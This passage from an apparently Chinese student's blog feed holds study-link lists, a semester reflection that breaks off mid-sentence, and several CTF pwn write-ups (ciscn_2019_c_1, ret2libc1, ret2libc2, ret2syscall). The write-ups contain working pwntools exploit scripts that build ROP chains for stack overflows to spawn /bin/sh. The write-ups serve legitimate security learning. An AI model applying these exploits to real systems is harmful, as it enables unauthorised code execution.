    <content type="html"><![CDATA[<h2 id="关于got表与plt表-x2F-libc库-x2F-动态链接知识"><a href="#关于got表与plt表-x2F-libc库-x2F-动态链接知识" class="headerlink" title="关于got表与plt表&#x2F;libc库&#x2F;动态链接知识"></a>关于got表与plt表&#x2F;libc库&#x2F;动态链接知识</h2><p>1、<a href="https://bkfish.github.io/2019/09/18/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/">https://bkfish.github.io/2019/09/18/%E4%BB%8Eret2libc%E4%B8%AD%E5%AD%A6%E4%B9%A0GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8%E4%BB%A5%E5%8F%8A%E5%8A%A8%E6%80%81%E8%AE%A1%E7%AE%97%E5%81%8F%E7%A7%BB/</a></p><p>2、<a href="https://www.wangan.com/docs/516">https://www.wangan.com/docs/516</a></p><h2 id="对wiki的补充知识"><a href="#对wiki的补充知识" class="headerlink" title="对wiki的补充知识"></a>对wiki的补充知识</h2><p>1、<a href="https://blog.csdn.net/qq_33948522/article/details/93880812">https://blog.csdn.net/qq_33948522/article/details/93880812</a></p><h2 id="基本工具知识文档"><a href="#基本工具知识文档" class="headerlink" title="基本工具知识文档"></a>基本工具知识文档</h2><p>1、pwntools</p><p><a href="https://docs.pwntools.com/en/stable/index.html">https://docs.pwntools.com/en/stable/index.html</a></p><p>2、gdb</p><p><a href="https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/">https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/</a></p><h2 id="springboot学习"><a href="#springboot学习" class="headerlink" title="springboot学习"></a>springboot学习</h2><p>1、<a href="https://www.jianshu.com/p/3d788198efab">https://www.jianshu.com/p/3d788198efab</a></p><p>2、<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1282386201411617">https://www.liaoxuefeng.com/wiki/1252599548343744/1282386201411617</a></p><h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><p>1、<a href="https://www.cnblogs.com/OliverQin/p/12571022.html">https://www.cnblogs.com/OliverQin/p/12571022.html</a></p><h2 id="pwn学习"><a href="#pwn学习" class="headerlink" title="pwn学习"></a>pwn学习</h2><p>1、一个很适合入门pwn的网站<a href="https://microcorruption.com/">https://microcorruption.com/</a></p><p>2、厘清PIE和ASLR的关系<a href="https://www.cnblogs.com/rec0rd/p/7646857.html">https://www.cnblogs.com/rec0rd/p/7646857.html</a></p><h2 id="解决配置问题的小资料"><a href="#解决配置问题的小资料" class="headerlink" title="解决配置问题的小资料"></a>解决配置问题的小资料</h2><p>1、git clone &#x2F;GnuTLS recv error <a href="https://blog.csdn.net/songtianlun/article/details/115611734">https://blog.csdn.net/songtianlun/article/details/115611734</a></p><h2 id="Android、Java、python、mySQL开发"><a href="#Android、Java、python、mySQL开发" class="headerlink" title="Android、Java、python、mySQL开发"></a>Android、Java、python、mySQL开发</h2><p>Android不能在主线程进行网络操作，不能在主线程之外进行UI操作。</p><p>1、JDBC-Android-mySQL<a href="https://blog.csdn.net/pjlddn/article/details/114759789">https://blog.csdn.net/pjlddn/article/details/114759789</a></p><p>2、PHP-Android-mySQL<a href="https://blog.csdn.net/u012811078/article/details/53367139">https://blog.csdn.net/u012811078/article/details/53367139</a></p><p>3、Android实时折线图<a href="https://blog.csdn.net/d276031034/article/details/65437293">https://blog.csdn.net/d276031034/article/details/65437293</a></p><p>4、Python-mysql-传感器数据<a href="https://blog.csdn.net/qq_43433255/article/details/86767399?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164560263916780366539399%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164560263916780366539399&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-7-86767399.pc_search_insert_es_download&utm_term=%E4%BC%A0%E6%84%9F%E5%99%A8%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AEpython123&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43433255/article/details/86767399?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164560263916780366539399%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164560263916780366539399&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-7-86767399.pc_search_insert_es_download&amp;utm_term=%E4%BC%A0%E6%84%9F%E5%99%A8%E9%87%87%E9%9B%86%E6%95%B0%E6%8D%AEpython123&amp;spm=1018.2226.3001.4187</a></p><p>5、Android-服务器socket教程<a href="https://www.runoob.com/w3cnote/android-tutorial-socket1.html">https://www.runoob.com/w3cnote/android-tutorial-socket1.html</a></p><p>6、Java线程池<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1306581130018849">https://www.liaoxuefeng.com/wiki/1252599548343744/1306581130018849</a></p><p>7、Android-mqtt连接教程<a href="https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/112461516">https://blog.csdn.net/BADAO_LIUMANG_QIZHI/article/details/112461516</a></p><p>8、关于python包的知识<a href="https://zhuanlan.zhihu.com/p/276461821">https://zhuanlan.zhihu.com/p/276461821</a></p><p>9、Android重力感应<a href="https://www.cnblogs.com/happyxiaoyu02/archive/2012/10/10/6818973.html">https://www.cnblogs.com/happyxiaoyu02/archive/2012/10/10/6818973.html</a></p><p>10、EMQX搭建<a href="https://blog.csdn.net/Myfittinglife/article/details/114629133">https://blog.csdn.net/Myfittinglife/article/details/114629133</a></p><p>11、python声音处理基础<a href="https://cloud.tencent.com/developer/article/1569981">https://cloud.tencent.com/developer/article/1569981</a></p><h2 id="Flask开发"><a href="#Flask开发" class="headerlink" title="Flask开发"></a>Flask开发</h2><p>1、debug mode on：<a href="https://blog.csdn.net/Deng872347348/article/details/124270963">https://blog.csdn.net/Deng872347348/article/details/124270963</a></p><h2 id="Linux操作系统"><a href="#Linux操作系统" class="headerlink" title="Linux操作系统"></a>Linux操作系统</h2><p>1、阅读linux内核源码<a href="https://elixir.bootlin.com/linux/latest/source">https://elixir.bootlin.com/linux/latest/source</a></p><p>2、指定linux启动内核<a href="https://www.cnblogs.com/zoneofmine/p/13229347.html">https://www.cnblogs.com/zoneofmine/p/13229347.html</a></p><p>3、timer_list定时器<a href="https://blog.csdn.net/qq_33406883/article/details/99633062">https://blog.csdn.net/qq_33406883/article/details/99633062</a></p><h2 id="学术论文搜索"><a href="#学术论文搜索" class="headerlink" title="学术论文搜索"></a>学术论文搜索</h2><p>1、dblp <a href="https://dblp.org/">https://dblp.org/</a></p><p>2、sci-hub <a href="https://sci-hub.se/">https://sci-hub.se/</a></p><h2 id="算法类"><a href="#算法类" class="headerlink" title="算法类"></a>算法类</h2><p>1、傅里叶变换 <a href="https://zhuanlan.zhihu.com/p/19759362">https://zhuanlan.zhihu.com/p/19759362</a></p><p>2、数据结构可视化 <a href="https://visualgo.net/zh">https://visualgo.net/zh</a></p><p>3、Apriori算法 <a href="https://zhuanlan.zhihu.com/p/39918644">https://zhuanlan.zhihu.com/p/39918644</a></p>]]></content>
    
    
    <categories>
      
      <category>智能学习机器人</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_c_1</title>
    <link href="/2021/03/27/ciscn-2019-c-1/"/>
    <url>/2021/03/27/ciscn-2019-c-1/</url>
    
    <content type="html"><![CDATA[<p>大概有一周这样没做题了，这周主要在学习基础一点的理论，学校课业也慢慢变多了（特别是程序设计作业，杀了我吧），挤了一点时间读wiki的ROP部分，被有bug和文不对题的题目折磨了好些时间，里面有些概念也需要另外找资料补充，就看得贼慢，一个下午才搞懂一两个知识点，不过总归还是有收获的，慢慢来就都能学会的orz。</p><p>然后wiki上的题直接复现感觉有很多疑点，包括一些偏移地址的知识和脚本的一些功能都搞不太清楚，就还是先上buuctf做下题。</p><p>先checksec嘛，是64位的！</p><p><img src="/2021/03/27/ciscn-2019-c-1/1.png"></p><p>然后就康康ida</p><p><img src="/2021/03/27/ciscn-2019-c-1/2.png"></p><p>显然，输入1进入encrypt函数，然后就能在里面发现一个gets（），这里会将输入的payload加密，注意到v0，可以在payload的开头放一个\0，就能绕过加密。网上也有wp说经过两次异或就能变回原数据，但是明显\0更加省心。</p><p><img src="/2021/03/27/ciscn-2019-c-1/3.png"></p><p>这里我用cyclic计算偏移地址的时候，奇怪地报错了（关于一报错就手无足措这件事），就通过s【rsp+0h】【rbp-50h】算出偏移量应该是50*16+8&#x3D;88，第一个字符应该是\0，那么填充的垃圾数据应该是87个。接下来因为没有system和&#x2F;bin&#x2F;sh，就得用ret2libc，又因为是64位程序，参数储存在寄存器中，就应该找到gadget，这里用的是ret2csu。</p><p><img src="/2021/03/27/ciscn-2019-c-1/4.png"></p><p>这里先调用一次loc_400c76，再调用一次loc_400c60，就能先依次pop，使rdx&#x3D;r13，rsi&#x3D;r14，edi&#x3D;r15d（只有低位8字节噢），然后会call[r12+rbx*8]这个地址指向的函数地址，因此要让这个地址不指向任一个地址，才能跳转到后面，cmp rbx,rbp，因此要让rbx&#x3D;rbp也就是pop的时候让rbp&#x3D;rbx+1，紧接再次把需要的数据pop进寄存器里，就能实现存储参数进寄存器，就能顺利调用需要的函数。</p><p>……</p><p>以上是第一条思路，紧接着就想到了明明可以直接使用ROPgadget &#x3D;-&#x3D;我人傻了</p><p>然后就找一下</p><p>64位程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><p>puts只有一个参数，就找rdi就行，比起csu直接难度跳水orz</p><p><img src="/2021/03/27/ciscn-2019-c-1/6.png"></p><p>接着是找puts的plt地址，泄露got地址找到匹配的libc版本，然后就能通过libc找到system和&#x2F;bin&#x2F;sh，ida就能找到</p><p><img src="/2021/03/27/ciscn-2019-c-1/5.png"></p><p>那么就能写exp啦</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br>content = 0<br>context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>ret = 0x4006b9<br>elf = ELF(<span class="hljs-string">&#x27;ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<br><br>pop_rdi_ret = 0x400c83<br><br><br>def main():<br><span class="hljs-keyword">if</span> content == 1:<br>p = process(<span class="hljs-string">&#x27;ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,27421)<br><br>payload = b<span class="hljs-string">&#x27;a&#x27;</span> * (0x50 + 8)<br>payload = payload + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>#<span class="hljs-built_in">print</span>(payload)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>puts_addr = u64(p.recv(7)[:-1].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(puts_addr)<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br><br>libc_base   = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr  = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (0x50 + 8)<br>payload = payload + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br><br>p.interactive()<br><br>main()<br></code></pre></td></tr></table></figure><p>关于这一题的一些小插曲，其实这一题包括前面其实我已经看了蛮多的ret2libc题目了，在hgame的时候是搜别人的wp的时候第一次搜到这个题型，也仿照别人的wp来写，但是无论如何都无法写对，在hgame的时候心理各方面压力也有点大，也不敢花太多时间深究，hgame结束后的三月份，重新一点一点地去看wiki学习，重新学到这部分才有了比较好的理解，但是wiki上提供的题目似乎是有问题的，返回的地址跟我找别人的wp的地址并不一样，直到做到这个题，我自己写的程序仍然没办法得出正确结果时，我使用了别人的exp来运行仍然报错，我才发现是我的libcsearcher安装得有问题，为此甚至花费了挺长的时间，libcsearcher安装也巨慢，关于这个事情，只能说是解决问题的经验还不够多orz，大概也有一种害怕遇到问题的心理存在，不过只要有进步就是好的，之后要更有解决问题的勇气才行。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc2</title>
    <link href="/2021/03/14/ret2libc2/"/>
    <url>/2021/03/14/ret2libc2/</url>
    
    <content type="html"><![CDATA[<p>先checksec，还是开了NX，就不能用shellcode了。</p><p><img src="/2021/03/14/ret2libc2/4.png"></p><p>看ida</p><p><img src="/2021/03/14/ret2libc2/1.png"></p><p>gets存在栈溢出漏洞，cyclic计算一下地址偏移量</p><p><img src="/2021/03/14/ret2libc2/2.png"></p><p>偏移地址仍然是112，那么填充112个垃圾数据就能劫持返回地址。</p><p><img src="/2021/03/14/ret2libc2/3.png"></p><p>在ida里看到有system的plt地址，但是没有找到&#x2F;bin&#x2F;sh，所以要手动把&#x2F;bin&#x2F;sh填充进去，然后有了binsh的地址，就能作为system的参数，这样就变成了ret2libc1。</p><p>然后是写ROPgadgets再次调用gets，把&#x2F;bin&#x2F;sh输入bss段里，这里bss段刚好有一个buf2可以放。</p><p><img src="/2021/03/14/ret2libc2/6.png"></p><p>接下来是找到gets的地址。</p><p><img src="/2021/03/14/ret2libc2/5.png"></p><p>就可以写exp啦</p><p>这里有两种方法，参见<a href="https://www.jianshu.com/p/c4780335b842">https://www.jianshu.com/p/c4780335b842</a></p><p>第二种用到栈堆平衡，就要先把gets的参数pop出来，pop到哪都无所谓，所以就ROP找一找pop的指令</p><p><img src="/2021/03/14/ret2libc2/7.png"></p><p>随便用一个短的pop ebx</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&#x27;./ret2libc2&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>gdb.attach(p)<br><br>system_plt = <span class="hljs-number">0x08048490</span><br>gets_plt = <span class="hljs-number">0x08048460</span><br>buf2 = <span class="hljs-number">0x0804a080</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>p.recvuntil(<span class="hljs-string">&#x27;What do you think ?&#x27;</span>)<br># payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + p32(gets_plt) +p32(system_plt) +p32(buf2)+ p32(buf2)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + p32(gets_plt) + p32(pop_ebx) + p32(buf2) + p32(system_plt) +<span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">4</span> + p32(buf2)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc1</title>
    <link href="/2021/03/10/ret2libc1/"/>
    <url>/2021/03/10/ret2libc1/</url>
    
    <content type="html"><![CDATA[<p>知识点：基本ROP&#x2F;cyclic计算地址偏移&#x2F;ROPgadget&#x2F;有’&#x2F;bin&#x2F;sh’与call _system情况下的系统调用</p><p>先checksec</p><p><img src="/2021/03/10/ret2libc1/1.png"></p><p>是32位程序，开启了栈堆不可执行保护，打开ida</p><p><img src="/2021/03/10/ret2libc1/2.png"></p><p>gets函数存在栈溢出，用cyclic计算偏移地址。</p><p>首先生成一个比较大的cyclic值。</p><p><img src="/2021/03/10/ret2libc1/3.png"></p><p>复制到ret2libc1的gdb里，实现栈溢出。<img src="/2021/03/10/ret2libc1/4.png"></p><p>这里的小箭头指向的就是要跳转的指令的地址，因为填充的数据不可跳转，就停在了这里，这里的0x62616164就是我们填充进去的cyclic中的某一小段，我们找到这一小段在cyclic中的地址，就可以算出需要填充多少垃圾数据，即劫持返回地址的偏移量。</p><p><img src="/2021/03/10/ret2libc1/5.png"></p><p>因此我们需要填充112个垃圾数据。</p><p>接下来寻找反汇编程序中是否含有&#x2F;bin&#x2F;sh与system函数</p><p><img src="/2021/03/10/ret2libc1/6.png"></p><p><img src="/2021/03/10/ret2libc1/7.png"></p><p>那么有了system和&#x2F;bin&#x2F;sh就可以写exp了，这一题跟系统调用不一样，本题是直接使用call system函数，&#x2F;bin&#x2F;sh应该放在栈中作为函数参数，但是系统调用需要把参数放入寄存器中，以int 80h作为函数参数。</p><p>exp</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08048720</span><br><span class="hljs-variable">system</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08048460</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;RET2LIBC &gt;_&lt;\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">system</span>) + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span> + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>)</span><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2syscall</title>
    <link href="/2021/03/10/ret2syscall/"/>
    <url>/2021/03/10/ret2syscall/</url>
    
    <content type="html"><![CDATA[<p>知识点：基本ROP&#x2F;ROPgadget&#x2F;有’&#x2F;bin&#x2F;sh’情况下的系统调用</p><p>打算跟着ctf wiki一题一题地学起，手动实践的时候还是能学到很多东西的。</p><p>首先是checksec，是32位程序，开启了栈堆不可执行保护，因此不能用shellcode来提权。</p><p><img src="/2021/03/10/ret2syscall/1.png"></p><p>打开ida查看源代码，存在gets函数栈溢出漏洞</p><p><img src="/2021/03/10/ret2syscall/2.png"></p><p>然后再搜索一下system和&#x2F;bin&#x2F;sh，发现只有&#x2F;bin&#x2F;sh</p><p><img src="/2021/03/10/ret2syscall/3.png"></p><p>那么可以通过gadgets构建ROP链，实现系统调用，具体资料如下</p><p><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></p><p>简而言之就是需要利用gadgets实现函数execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)，那么应该往eax存入0xb（系统调用号），往ebx存入“&#x2F;bin&#x2F;sh”（通过pop ebx实现），往ecx与edx中存入0。尽管这是32位程序，函数调用参数通常是使用栈上数据，但在使用系统调用时，需要修改寄存器达到系统调用目的。</p><p>那么接下来就要寻找合适的gadgets。</p><p><img src="/2021/03/10/ret2syscall/4.png"></p><p>用图上两个地方的gadgets就可以实现寄存器的修改。</p><p>接下来寻找&#x2F;bin&#x2F;sh和int 80h的地址，就可以将&#x2F;bin&#x2F;sh pop入ebx中，并在最后调用int80h。</p><p><img src="/2021/03/10/ret2syscall/5.png"></p><p>那么全部地址都凑齐了，就可以写exp了</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span> *<br><span class="hljs-variable">p</span> = <span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./rop&#x27;</span>)</span><br><span class="hljs-variable">context.log_level</span> = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-variable">gdb.attach</span>(<span class="hljs-variable">p</span>)<br><br><span class="hljs-variable">binsh</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080be408</span><br><span class="hljs-variable">int80</span> = <span class="hljs-number">0</span><span class="hljs-variable">x08049421</span><br><span class="hljs-variable">edx_ecx_ebx_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x0806eb90</span><br><span class="hljs-variable">eax_ret</span> = <span class="hljs-number">0</span><span class="hljs-variable">x080bb196</span>    <span class="hljs-comment">//通过ROPgadget获取到的信息</span><br><br><span class="hljs-variable">p.recvuntil</span>(<span class="hljs-string">&#x27;What do you plan to do?\n&#x27;</span>)<br><span class="hljs-variable">payload</span> = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">112</span> + <span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-variable">eax_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">xb</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">edx_ecx_ebx_ret</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-number">0</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">binsh</span>) + <span class="hljs-title">p32</span>(<span class="hljs-variable">int80</span>)</span><br><span class="hljs-comment">//填充垃圾数据--系统调用号pop入eax并返回--exceve函数参数pop入对应寄存器并返回--调用int 80h</span><br><br><span class="hljs-variable">p.send</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2021-学期小结</title>
    <link href="/2021/03/03/HGAME%E5%AF%92%E5%81%87/"/>
    <url>/2021/03/03/HGAME%E5%AF%92%E5%81%87/</url>
    
    <content type="html"><![CDATA[<h2 id="关于大一上"><a href="#关于大一上" class="headerlink" title="关于大一上"></a>关于大一上</h2><p>​第一学期在一个比较混乱又匆忙的学习中匆匆度过了，在我的记忆中这段时间其实是非常迷茫的，经历了比较多的焦虑，在很多方面比如绩点、考研、内卷之类的奇怪问题有时候有过度的在意，也结交到了一些朋友，总体上我认为是属于一个探索的阶段，但是在第一学期其实在能力上没有什么长进，大部分空余时间在看《c primer plus》（虽然现在还剩一小部分没看完），反思过来在学习方法上的缺点其实跟以前是差不多的，在对于要学的东西的整体上了解太少，导致对于要学什么、怎么学的认知太片面了，当时的我是发现了一点点对安全方面的兴趣</p><p>，但是对互联网很多东西了解本来就比较少，以至于不知道从哪里开始入门，厘清各种安全方向也花了一点时间，在学期末的时候有特别棒的学姐来找我交流，才慢慢对安全方面有了一点认识，12月30日，第一次在buuctf尝试看着别人的wp做了一道入门的pwn题，在那一小段时间里，搭建了博客，又在buuctf照着wp做了几题，然后发现我在汇编上面的基础确实太薄弱了，甚至很多很基础的操作也不会（比如看ida啥的）在此之前基本只学过c语言和一点点c++，对于很多ctf的工具、要提前学的东西什么的都没有准备，就先开始了看汇编语言，关于这个最感激的还是那位学姐orz，只是大概十来天后就开始期末备考和考试周了，于是这些事情也搁置了下来，匆匆忙忙考完试，这个学期也就匆匆忙忙地结束了。</p><h2 id="关于HGAME2021"><a href="#关于HGAME2021" class="headerlink" title="关于HGAME2021"></a>关于HGAME2021</h2><p>​1.28结束考试回家后，就着手准备下等待30号的hgame了，这个时候的几天属于不知道要干什么但是还是干一下吧的状态，由于根本也没太多接触ctf的题型，就还是瞎逛了一下buuctf，做了一点basic题目，阅读汇编语言（上学期没看多少就要备考了，所以还剩挺多的），然后做了下兔兔的题有点云里雾里。</p><h3 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h3><p>​30号hgame开始那两三天，是先做了misc的两题，还有两三题有尝试过但是没办法做出来orz，然后做出了pwn的签到题，并且看了看其他pwn题的题型，该怎么说呢，在做misc和crypto的时候，完全是依靠百度上别人的blog来做，解密题其实还好，就找“ctf密码学题型总结”啥的（doge），还是能得到比较全面的认识。做misc-galaxy的时候其实耗费了很多时间，因为以前根本没接触过流量分析是啥玩意，个人体质也属于web黑洞（，看web资料有点像看天书，所以对于这题其实是一点一点google从“apk文件是什么”查起的，虽然最后是做出来了这道题，但是关于流量分析还是不太了解，只会真·瞎点（我觉得主要原因还是在于web知识的匮乏），对于图片隐写方面还是学习到了很多，做完这道题又尝试做了其他的crypto和misc题目，觉得这两个题型在没啥入门经验的时候，真的是很容易自己误导自己啊，做题的时候只能半猜半做，看着别人blog一点点尝试，有时甚至坚定地认为某个方法是对的（真是太年轻），然后week1的时候也不太敢问出题人，就自己反复撞墙。crypto1和misc2卡了许久，甚至不知道压缩包能直接密码爆破……网上的资料过于综合，适用别的题目的方法其实不一定适用于我做的题，就还是学到了很多知识但是解不出题，也不知道哪些资料适用于这个题，就浪费了挺多时间。最智障的是完全忘记了ctf wiki的存在，后面才翻出来，提高了一点效率。</p><p>​week1在反复撞墙中做题花了有三四天这样，但是收获并不多，并且几乎没有去看pwn题，反思了半小时决定还是尝试学习一下pwn看看能不能得分。然后很迷茫的下载了letter看了ida，发现汇编也看不懂，只知道是个栈溢出，溢出以后怎么getshell也不知道，茫然地看了一会，又茫然地google了下“pwn 